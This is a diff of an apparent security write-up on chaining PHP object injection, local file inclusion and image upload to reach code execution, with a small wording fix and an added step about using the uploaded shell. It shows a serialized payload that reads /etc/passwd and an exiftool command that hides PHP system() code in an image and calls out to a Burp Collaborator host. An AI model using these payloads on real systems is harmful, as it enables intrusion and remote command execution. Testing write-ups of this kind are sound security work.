@@ -85,7 +85,7 @@ This is our payload; pretty easy to understand, I have just replaced the class n
 
 O:11:"IncludeFile":1:{s:8:"filename";s11:"/etc/passwd";}
 
-This is cool, let's base64 encode; and boomm!! it worked
+This is cool, let's base64 encode it; and boomm!! it worked
 
 ![](https://github.com/InfoSecAntara/theantaramane/assets/img/etc_passwd.jpg)
 
@@ -98,10 +98,15 @@ So I had a file upload functionality, and this functionality only allows the ima
   1. Create an Image file with PHP code using exif or any other image utility tool 
   2. Upoad the file and locate the path
   3. Utilize LFI include image file and make an Out of Band call to confirm the code execution
+  4. Make use of the shell uploaded and run arbitrary commands 
 
 We will be using exif tool with the following command:
 
-"exiftool -Comment='<?php system("nslookup 4lqd7k2ulofzkiwzv0m5gf7qohu8ix.burpcollaborator.net"); ?>' beingsecure.jpeg"
+   "exiftool -Comment='<?php system("nslookup 4lqd7k2ulofzkiwzv0m5gf7qohu8ix.burpcollaborator.net"); ?>' beingsecure.jpeg"
+
+
+
+
 
 
 
